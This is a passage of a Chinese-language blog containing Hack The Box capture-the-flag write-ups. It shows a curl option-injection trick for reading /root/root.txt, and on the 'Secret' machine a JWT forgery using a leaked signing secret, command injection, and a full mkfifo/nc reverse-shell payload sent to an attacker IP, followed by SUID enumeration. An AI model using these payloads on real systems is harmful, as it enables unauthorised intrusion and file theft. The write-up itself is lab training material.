pyinstxtractor.py treport [+] Processing treport [+] Pyinstaller version: 2.1+ [+] Python version: 38 [+] Length of package: 6798297 bytes [+] Found 46 files in CArchive [+] Beginning extraction...please standby [+] Possible entry point: pyiboot01_bootstrap.pyc [+] Possible entry point: pyi_rth_pkgutil.pyc [+] Possible entry point: pyi_rth_multiprocessing.pyc [+] Possible entry point: pyi_rth_inspect.pyc [+] Possible entry point: treport.pyc [!] Warning: This script is running in a different Python version than the one used to build the executable. [!] Please run this script in Python38 to prevent extraction errors during unmarshalling [!] Skipping pyz extraction [+] Successfully extracted pyinstaller archive: treport You can now use a python decompiler on the pyc files within the extracted directory https://github.com/LucifielHack/pycdc 这里使用一个py和c++的反编译工具 进入目录 cmake CMakeLists.txt 选择y ┌──(root💀kali)-[~/Desktop/pyinstxtractor/pycdc] └─# cmake CMakeLists.txt 2 ⨯ -- The C compiler identification is GNU 10.2.1 -- The CXX compiler identification is GNU 10.2.1 -- Detecting C compiler ABI info -- Detecting C compiler ABI info - done -- Check for working C compiler: /usr/bin/cc - skipped -- Detecting C compile features -- Detecting C compile features - done -- Detecting CXX compiler ABI info -- Detecting CXX compiler ABI info - done -- Check for working CXX compiler: /usr/bin/c++ - skipped -- Detecting CXX compile features -- Detecting CXX compile features - done -- Found PythonInterp: /usr/bin/python (found version &quot;2.7.18&quot;) -- Configuring done -- Generating done -- Build files have been written to: /root/Desktop/pyinstxtractor/pycdc ┌──(root💀kali)-[~/Desktop/pyinstxtractor/pycdc] └─# make [ 2%] Generating bytes/python_10.cpp, bytes/python_11.cpp, bytes/python_13.cpp, bytes/python_14.cpp, bytes/python_15.cpp, bytes/python_16.cpp, bytes/python_20.cpp, bytes/python_21.cpp, bytes/python_22.cpp, bytes/python_23.cpp, bytes/python_24.cpp, bytes/python_25.cpp, bytes/python_26.cpp, bytes/python_27.cpp, bytes/python_30.cpp, bytes/python_31.cpp, bytes/python_32.cpp, bytes/python_33.cpp, bytes/python_34.cpp, bytes/python_35.cpp, bytes/python_36.cpp, bytes/python_37.cpp, bytes/python_38.cpp, bytes/python_39.cpp, bytes/python_310.cpp [ 4%] Building CXX object CMakeFiles/pycxx.dir/bytecode.cpp.o [ 7%] Building CXX object CMakeFiles/pycxx.dir/data.cpp.o [ 9%] Building CXX object CMakeFiles/pycxx.dir/pyc_code.cpp.o [ 12%] Building CXX object CMakeFiles/pycxx.dir/pyc_module.cpp.o [ 14%] Building CXX object CMakeFiles/pycxx.dir/pyc_numeric.cpp.o [ 17%] Building CXX object CMakeFiles/pycxx.dir/pyc_object.cpp.o [ 19%] Building CXX object CMakeFiles/pycxx.dir/pyc_sequence.cpp.o [ 21%] Building CXX object CMakeFiles/pycxx.dir/pyc_string.cpp.o [ 24%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_10.cpp.o [ 26%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_11.cpp.o [ 29%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_13.cpp.o [ 31%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_14.cpp.o [ 34%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_15.cpp.o [ 36%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_16.cpp.o [ 39%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_20.cpp.o [ 41%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_21.cpp.o [ 43%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_22.cpp.o [ 46%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_23.cpp.o [ 48%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_24.cpp.o [ 51%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_25.cpp.o [ 53%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_26.cpp.o [ 56%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_27.cpp.o [ 58%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_30.cpp.o [ 60%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_31.cpp.o [ 63%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_32.cpp.o [ 65%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_33.cpp.o [ 68%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_34.cpp.o [ 70%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_35.cpp.o [ 73%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_36.cpp.o [ 75%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_37.cpp.o [ 78%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_38.cpp.o [ 80%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_39.cpp.o [ 82%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_310.cpp.o [ 85%] Linking CXX static library libpycxx.a [ 85%] Built target pycxx [ 87%] Building CXX object CMakeFiles/pycdas.dir/pycdas.cpp.o [ 90%] Linking CXX executable pycdas [ 90%] Built target pycdas [ 92%] Building CXX object CMakeFiles/pycdc.dir/pycdc.cpp.o [ 95%] Building CXX object CMakeFiles/pycdc.dir/ASTree.cpp.o [ 97%] Building CXX object CMakeFiles/pycdc.dir/ASTNode.cpp.o [100%] Linking CXX executable pycdc [100%] Built target pycdc ┌──(root💀kali)-[~/Desktop/pyinstxtractor/pycdc] └─# ./pycdc /root/Desktop/pyinstxtractor/treport_extracted/treport.pyc # Source Generated with Decompyle++ # File: treport.pyc (Python 3.9) Unsupported opcode: &lt;255&gt; import os import sys from datetime import datetime import re class threat_report: def create(self): Unsupported opcode: &lt;255&gt; file_name = input(&#39;Enter the filename:&#39;) content = input(&#39;Enter the report:&#39;) if &#39;../&#39; in file_name: print(&#39;NOT ALLOWED&#39;) sys.exit(0) file_path = &#39;/root/reports/&#39; + file_name # WARNING: Decompyle incomplete def list_files(self): file_list = os.listdir(&#39;/root/reports/&#39;) files_in_dir = &#39; &#39;.join((lambda .0: [ str(elem) for elem in .0 ])(file_list)) print(&#39;ALL THE THREAT REPORTS:&#39;) print(files_in_dir) def read_file(self): Unsupported opcode: &lt;255&gt; file_name = input(&#39;\\nEnter the filename:&#39;) if &#39;../&#39; in file_name: print(&#39;NOT ALLOWED&#39;) sys.exit(0) contents = &#39;&#39; file_name = &#39;/root/reports/&#39; + file_name # WARNING: Decompyle incomplete def download(self): now = datetime.now() current_time = now.strftime(&#39;%H_%M_%S&#39;) command_injection_list = [ &#39;$&#39;, &#39;`&#39;, &#39;;&#39;, &#39;&amp;&#39;, &#39;|&#39;, &#39;||&#39;, &#39;&gt;&#39;, &#39;&lt;&#39;, &#39;?&#39;, &quot;&#39;&quot;, &#39;@&#39;, &#39;#&#39;, &#39;$&#39;, &#39;%&#39;, &#39;^&#39;, &#39;(&#39;, &#39;)&#39;] ip = input(&#39;Enter the IP/file_name:&#39;) res = bool(re.search(&#39;\\\\s&#39;, ip)) if res: print(&#39;INVALID IP&#39;) sys.exit(0) if &#39;file&#39; in ip and &#39;gopher&#39; in ip or &#39;mysql&#39; in ip: print(&#39;INVALID URL&#39;) sys.exit(0) cmd = &#39;/bin/bash -c &quot;curl &#39; + ip + &#39; -o /root/reports/threat_report_&#39; + current_time + &#39;&quot;&#39; os.system(cmd) # WARNING: Decompyle incomplete 通过分析上述源码，我们可以看到这里使用curl命令来下载，但是使用了过滤，想办法构造语句绕过一下即可 code@code:~$ sudo /usr/bin/treport 1.Create Threat Report. 2.Read Threat Report. 3.Download A Threat Report. 4.Quit. Enter your choice:3 Enter the IP/file_name:{--config,/root/root.txt} Warning: /root/root.txt:1: warning: &#39;2f935df00d52a1b17035600df088e81d&#39; is Warning: unknown curl: no URL specified! curl: try &#39;curl --help&#39; or &#39;curl --manual&#39; for more information 直接使用下载，并构造恶意语句读取指定的文件即可，成功拿到root权限的flag文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Secret - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Secret","date":"2021-12-06T11:38:36.000Z","updated":"2023-06-13T03:50:21.000Z","comments":true,"path":"2021/12/06/Hackthebox/Easy/Hackthebox-Secret/","link":"","permalink":"http://www.lucifiel.com/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/","excerpt":"","text":"Hackthebox - Secret靶场信息 靶场类型 信息搜集首先进行端口扫描 ┌──(root💀kali)-[~/Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.120 Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-08 02:09 EST Nmap scan report for 10.10.11.120 Host is up (0.40s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA) | 256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA) |_ 256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: DUMB Docs 3000/tcp open http Node.js (Express middleware) |_http-title: DUMB Docs No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=11/8%OT=22%CT=1%CU=33102%PV=Y%DS=2%DC=T%G=Y%TM=6188CD7 OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ OS:(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O OS:3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2= OS:FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSN OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 995/tcp) HOP RTT ADDRESS 1 851.60 ms 10.10.14.1 2 713.96 ms 10.10.11.120 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 80.73 seconds 经过查看后发现80端口和3000端口内容一致 咱们去看看80端口的内容 这好像是一个文件管理服务器之类的什么东西的？咱英文不好，咱也不知道，咱也不敢问 右上角有个按钮Live Demo，反正点了也不会爆炸，点点看呗 这是API接口啊，但是好像没有内容，咱们往下看看 这里好像是可以下载源代码，管他的先下载下来看看呗 这应该是一个开源项目，然后还有git文件泄露，那就先下载下来嘛 https://github.com/LucifielHack/GitTools 下载下来后利用一下 /root/Desktop/GitTools/Extractor/extractor.sh local-web/ dump 内容比较多，咱们等他先下载完吧，等的时候可以去看会儿视频 ┌──(root💀kali)-[~/Desktop/dump] └─# ls -la 总用量 32 drwxr-xr-x 8 root root 4096 11月 29 20:53 . drwxr-xr-x 6 root root 4096 11月 29 20:47 .. drwxr-xr-x 7 root root 4096 11月 29 20:48 0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb drwxr-xr-x 7 root root 4096 11月 29 20:50 1-55fe756a29268f9b4e786ae468952ca4a8df1bd8 drwxr-xr-x 7 root root 4096 11月 29 20:51 2-e297a2797a5f62b6011654cf6fb6ccb6712d2d5b drwxr-xr-x 7 root root 4096 11月 29 20:52 3-de0a46b5107a2f4d26e348303e76d85ae4870934 drwxr-xr-x 7 root root 4096 11月 29 20:53 4-67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78 drwxr-xr-x 7 root root 4096 11月 29 20:54 5-3a367e735ee76569664bf7754eaaade7c735d702 完成后可以看到有提取出六次数据，咱们随便进一个看看 ┌──(root💀kali)-[~/Desktop/dump/0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb] └─# ls -la 总用量 116 drwxr-xr-x 7 root root 4096 11月 29 20:48 . drwxr-xr-x 8 root root 4096 11月 29 20:53 .. -rw-r--r-- 1 root root 219 11月 29 20:47 commit-meta.txt -rw-r--r-- 1 root root 174 11月 29 20:47 .env -rw-r--r-- 1 root root 885 11月 29 20:47 index.js drwxr-xr-x 2 root root 4096 11月 29 20:47 model drwxr-xr-x 201 root root 4096 11月 29 20:48 node_modules -rw-r--r-- 1 root root 491 11月 29 20:48 package.json -rw-r--r-- 1 root root 69452 11月 29 20:48 package-lock.json drwxr-xr-x 3 root root 4096 11月 29 20:48 public drwxr-xr-x 2 root root 4096 11月 29 20:48 routes drwxr-xr-x 4 root root 4096 11月 29 20:48 src -rw-r--r-- 1 root root 651 11月 29 20:48 validations.js 可以确定是一个源码库了，突破口在/routes/auto.js中 const router = require(&#39;express&#39;).Router(); const User = require(&#39;../model/user&#39;); const bcrypt = require(&#39;bcryptjs&#39;) const jwt = require(&#39;jsonwebtoken&#39;) const { registerValidation, loginValidation} = require(&#39;../validations&#39;) router.post(&#39;/register&#39;, async (req, res) =&gt; { // validation const { error } = registerValidation(req.body) if (error) return res.status(400).send(error.details[0].message); // check if user exists const emailExist = await User.findOne({email:req.body.email}) if (emailExist) return res.status(400).send(&#39;Email already Exist&#39;) // check if user name exist const unameexist = await User.findOne({ name: req.body.name }) if (unameexist) return res.status(400).send(&#39;Name already Exist&#39;) //hash the password const salt = await bcrypt.genSalt(10); const hashPaswrod = await bcrypt.hash(req.body.password, salt) //create a user const user = new User({ name: req.body.name, email: req.body.email, password:hashPaswrod }); try{ const saveduser = await user.save(); res.send({ user: user.name}) } catch(err){ console.log(err) } }); // login router.post(&#39;/login&#39;, async (req , res) =&gt; { const { error } = loginValidation(req.body) if (error) return res.status(400).send(error.details[0].message); // check if email is okay const user = await User.findOne({ email: req.body.email }) if (!user) return res.status(400).send(&#39;Email is wrong&#39;); // check password const validPass = await bcrypt.compare(req.body.password, user.password) if (!validPass) return res.status(400).send(&#39;Password is wrong&#39;); // create jwt const token = jwt.sign({ _id: user.id, name: user.name , email: user.email}, process.env.TOKEN_SECRET ) res.header(&#39;auth-token&#39;, token).send(token); }) router.use(function (req, res, next) { res.json({ message: { message: &quot;404 page not found&quot;, desc: &quot;page you are looking for is not found. &quot; } }) }); module.exports = router 这是auto.js 内的源码，可以看出来有/register来请求它 首先添加一个DNS解析 echo 10.10.11.120 secret.htb &gt;&gt; /etc/hosts 构造一个payload来注册用户 curl -X POST -H &#39;Content-Type: application/json&#39; -v http://secret.htb/api/user/register --data &#39;{&quot;name&quot;: &quot;lucifiel&quot;,&quot;email&quot;: &quot;lucifiel@lucifiel.com&quot;,&quot;password&quot;: &quot;123456&quot;}&#39; 然后使用注册的用户进行登录 curl -X POST -H &#39;Content-Type: application/json&#39; -v http://secret.htb/api/user/login --data &#39;{&quot;email&quot;: &quot;lucifiel@lucifiel.com&quot;,&quot;password&quot;: &quot;123456&quot;}&#39; ┌──(root💀kali)-[~] └─# curl -X POST -H &#39;Content-Type: application/json&#39; -v http://secret.htb/api/user/login --data &#39;{&quot;email&quot;: &quot;lucifiel@lucifiel.com&quot;,&quot;password&quot;: &quot;123456&quot;}&#39; Note: Unnecessary use of -X or --request, POST is already inferred. * Trying 10.10.11.120:80... * Connected to secret.htb (10.10.11.120) port 80 (#0) &gt; POST /api/user/login HTTP/1.1 &gt; Host: secret.htb &gt; User-Agent: curl/7.74.0 &gt; Accept: */* &gt; Content-Type: application/json &gt; Content-Length: 55 &gt; * upload completely sent off: 55 out of 55 bytes * Mark bundle as not supporting multiuse &lt; HTTP/1.1 200 OK &lt; Server: nginx/1.18.0 (Ubuntu) &lt; Date: Mon, 06 Dec 2021 06:28:56 GMT &lt; Content-Type: text/html; charset=utf-8 &lt; Content-Length: 216 &lt; Connection: keep-alive &lt; X-Powered-By: Express &lt; auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoibHVjaWZpZWwiLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.i-XDDPEDPnogLpVNIKO-U4vQCyQqsIWCN5Ib_OjwSrM &lt; ETag: W/&quot;d8-L4wZphXtP/sfJQE0ke71PfuUMnY&quot; &lt; * Connection #0 to host secret.htb left intact eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoibHVjaWZpZWwiLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.i-XDDPEDPnogLpVNIKO-U4vQCyQqsIWCN5Ib_OjwSrM 成功登录并获取到token 查看并分析/routes/verifytoken.js文件的内容 const jwt = require(&quot;jsonwebtoken&quot;); module.exports = function (req, res, next) { const token = req.header(&quot;auth-token&quot;); if (!token) return res.status(401).send(&quot;Access Denied&quot;); try { const verified = jwt.verify(token, process.env.TOKEN_SECRET); req.user = verified; next(); } catch (err) { res.status(400).send(&quot;Invalid Token&quot;); } }; 我们知道了JWT令牌的验证过程，那我们就构造一个payload查看一下我们当前的权限 curl http://secret.htb/api/priv -H &#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoibHVjaWZpZWwiLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.i-XDDPEDPnogLpVNIKO-U4vQCyQqsIWCN5Ib_OjwSrM&#39; ┌──(root💀kali)-[~] └─# curl http://secret.htb/api/priv -H &#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoibHVjaWZpZWwiLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.i-XDDPEDPnogLpVNIKO-U4vQCyQqsIWCN5Ib_OjwSrM&#39; {&quot;role&quot;:{&quot;role&quot;:&quot;you are normal user&quot;,&quot;desc&quot;:&quot;lucifiel&quot;}} 得到回包，我们是一个普通用户权限 ┌──(root💀kali)-[~/Desktop/dump/0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb] └─# cat .env DB_CONNECT = &#39;mongodb://127.0.0.1:27017/auth-web&#39; TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE 查看根目录的.env文件，得到了一段tokne const router = require(&#39;express&#39;).Router(); const verifytoken = require(&#39;./verifytoken&#39;) const User = require(&#39;../model/user&#39;); router.get(&#39;/priv&#39;, verifytoken, (req, res) =&gt; { // res.send(req.user) const userinfo = { name: req.user } const name = userinfo.name.name; if (name == &#39;theadmin&#39;){ res.json({ role:{ role:&quot;you are admin&quot;, desc : &quot;{flag will be here}&quot; } }) } else{ res.json({ role: { role: &quot;you are normal user&quot;, desc: userinfo.name.name } }) } }) router.use(function (req, res, next) { res.json({ message: { message: &quot;404 page not found&quot;, desc: &quot;page you are looking for is not found. &quot; } }) }); module.exports = router 通过查看private.js得知验证逻辑是只要name &#x3D; theadmin 就是admin账户，那我们来伪造一个JWT令牌即可 使用在线JWT修改工具或jwt_tools进行JWT令牌修改都可以 https://jwt.io/ https://github.com/ticarpi/jwt_tool 在线工具然后伪造一个admin的token就可以了 这里需要修改两个地方，把name处修改为theadmin，然后在下方框内填入我们在.env获取到的token值，即可生成一段新的JWT令牌 JWT_Toolspython3 jwt_tool.py -I -S hs256 -pc &#39;name&#39; -pv &#39;theadmin&#39; -p &#39;gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE&#39; eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTdlMjgxZWU2N2QzZTA4NTMzOGEzZjYiLCJuYW1lIjoib29wc2llIiwiZW1haWwiOiJvb3BzaWVAb29wcy5jb20iLCJpYXQiOjE2MzU2NTc4NTd9.7v-DST155DL_5yuhC9Zbe2rdyPiGCcd8aeYUucQLVzU 我们继续 ┌──(root💀kali)-[~/Desktop/dump/0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb] └─# curl http://secret.htb/api/priv -H &#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.FM3CbCKxrJ79hXwF02Rg3jsi5bpNeg1txPyb2nWbAA0&#39; {&quot;creds&quot;:{&quot;role&quot;:&quot;admin&quot;,&quot;username&quot;:&quot;theadmin&quot;,&quot;desc&quot;:&quot;welcome back admin&quot;}} 我们去验证一下新的JWT令牌，发现已经是admin权限了 通过分析private.js文件，我们发现必须将文件名指定为带有名称文件的get参数 ┌──(root💀kali)-[~/Desktop/dump/0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/routes] └─# curl &#39;http://secret.htb/api/logs?file=/etc/passwd&#39; -H &#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.FM3CbCKxrJ79hXwF02Rg3jsi5bpNeg1txPyb2nWbAA0&#39; {&quot;killed&quot;:false,&quot;code&quot;:128,&quot;signal&quot;:null,&quot;cmd&quot;:&quot;git log --oneline /etc/passwd&quot;} 看着感觉像是命令注入？ 漏洞利用┌──(root💀kali)-[~/Desktop/dump/0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/routes] └─# curl &#39;http://secret.htb/api/logs?file=;id&#39; -H &#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.FM3CbCKxrJ79hXwF02Rg3jsi5bpNeg1txPyb2nWbAA0&#39; &quot;80bf34c fixed typos 🎉\\n0c75212 now we can view logs from server 😃\\nab3e953 Added the codes\\nuid=1000(dasith) gid=1000(dasith) groups=1000(dasith)\\n&quot; OK，确认漏洞是存在的，那么我们现在先使用nc监听一个端口 nc -nvlp 4444 然后接着构造一个payload来进行利用 ┌──(root💀kali)-[~/Desktop/dump/0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/routes] └─# curl &#39;http://secret.htb/api/logs?file=;rm+%2Ftmp%2Ff%3Bmkfifo+%2Ftmp%2Ff%3Bcat+%2Ftmp%2Ff%7C%2Fbin%2Fsh+-i+2%3E%261%7Cnc+10.10.14.12+4444+%3E%2Ftmp%2Ff%0A%0A&#39; -H &#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.FM3CbCKxrJ79hXwF02Rg3jsi5bpNeg1txPyb2nWbAA0&#39; {&quot;killed&quot;:false,&quot;code&quot;:1,&quot;signal&quot;:null,&quot;cmd&quot;:&quot;git log --oneline ;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.12 4444 &gt;/tmp/f\\n\\n&quot;} ┌──(root💀kali)-[~] └─# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.12] from (UNKNOWN) [10.10.11.120] 40314 /bin/sh: 0: can&#39;t access tty; job control turned off $ python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;; dasith@secret:~/local-web$ whoami&amp;&amp;id whoami&amp;&amp;id dasith uid=1000(dasith) gid=1000(dasith) groups=1000(dasith) 成功获取到一个shell dasith@secret:~/local-web$ cd cd dasith@secret:~$ ls ls local-web user.txt dasith@secret:~$ cat user.txt cat user.txt 2b3b6e0a590097b69da4de9631b570fd 成功获取到user权限的flag文件 权限提升查看一下当前的可执行文件 find / -type f -perm -u=s 2&gt;/dev/null dasith@secret:~$ find / -type f -perm -u=s 2&gt;/dev/null find / -type f -perm -u=s 2&gt;/dev/null /usr/bin/pkexec /usr/bin/sudo /usr/bin/fusermount /usr/bin/umount /usr/bin/mount /usr/bin/gpasswd /usr/bin/su /usr/bin/passwd /usr/bin/chfn /usr/bin/newgrp /usr/bin/chsh /usr/lib/snapd/snap-confine /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/openssh/ssh-keysign /usr/lib/eject/dmcrypt-get-device /usr/lib/policykit-1/polkit-agent-helper-1 /opt/count /snap/snapd/13640/usr/lib/snapd/snap-confine /snap/snapd/13170/usr/lib/snapd/snap-confine /snap/core20/1169/usr/bin/chfn /snap/core20/1169/usr/bin/chsh /snap/core20/1169/usr/bin/gpasswd /snap/core20/1169/usr/bin/mount /snap/core20/1169/usr/bin/newgrp /snap/core20/1169/usr/bin/passwd /snap/core20/1169/usr/bin/su /snap/core20/1169/usr/bin/sudo /snap/core20/1169/usr/bin/umount /snap/core20/1169/usr/lib/dbus-1.0/dbus-daemon-launch-helper /snap/core20/1169/usr/lib/openssh/ssh-keysign /snap/core18/2128/bin/mount /snap/core18/2128/bin/ping /snap/core18/2128/bin/su /snap/core18/2128/bin/umount /snap/core18/2128/usr/bin/chfn /snap/core18/2128/usr/bin/chsh /snap/core18/2128/usr/bin/gpasswd /snap/core18/2128/usr/bin/newgrp /snap/core18/2128/usr/bin/passwd /snap/core18/2128/usr/bin/sudo /snap/core18/2128/usr/lib/dbus-1.0/dbus-daemon-launch-helper /snap/core18/2128/usr/lib/openssh/ssh-keysign /snap/core18/1944/bin/mount /snap/core18/1944/bin/ping /snap/core18/1944/bin/su /snap/core18/1944/bin/umount /snap/core18/1944/usr/bin/chfn /snap/core18/1944/usr/bin/chsh /snap/core18/1944/usr/bin/gpasswd /snap/core18/1944/usr/bin/newgrp /snap/core18/1944/usr/bin/passwd /snap/core18/1944/usr/bin/sudo /snap/core18/1944/usr/lib/dbus-1.0/dbus-daemon-launch-helper /snap/core18/1944/usr/lib/openssh/ssh-keysign 获取到了一些可执行的二进制文件 我们把目光着眼放在/opt/count上 dasith@secret:/opt$ cat code.c cat code.c #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;dirent.h&gt; #include &lt;sys/prctl.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/stat.h&gt; #include &lt;linux/limits.h&gt; void dircount(const char *path, char *summary) { DIR *dir; char fullpath[PATH_MAX]; struct dirent *ent; struct stat fstat; int tot = 0, regular_files = 0, directories = 0, symlinks = 0; if((dir = opendir(path)) == NULL) { printf(&quot;\\nUnable to open directory.\\n&quot;); exit(EXIT_FAILURE); } while ((ent = readdir(dir)) != NULL) { ++tot; strncpy(fullpath, path, PATH_MAX-NAME_MAX-1); strcat(fullpath, &quot;/&quot;); strncat(fullpath, ent-&gt;d_name, strlen(ent-&gt;d_name)); if (!lstat(fullpath, &amp;fstat)) { if(S_ISDIR(fstat.st_mode)) { printf(&quot;d&quot;); ++directories; } else if(S_ISLNK(fstat.st_mode)) { printf(&quot;l&quot;); ++symlinks; } else if(S_ISREG(fstat.st_mode)) { printf(&quot;-&quot;); ++regular_files; } else printf(&quot;?&quot;); printf((fstat.st_mode &amp; S_IRUSR) ? &quot;r&quot; : &quot;-&quot;); printf((fstat.st_mode &amp; S_IWUSR) ? &quot;w&quot; : &quot;-&quot;); printf((fstat.st_mode &amp; S_IXUSR) ? &quot;x&quot; : &quot;-&quot;); printf((fstat.st_mode &amp; S_IRGRP) ? &quot;r&quot; : &quot;-&quot;); printf((fstat.st_mode &amp; S_IWGRP) ? &quot;w&quot; : &quot;-&quot;); printf((fstat.st_mode &amp; S_IXGRP) ? &quot;x&quot; : &quot;-&quot;); 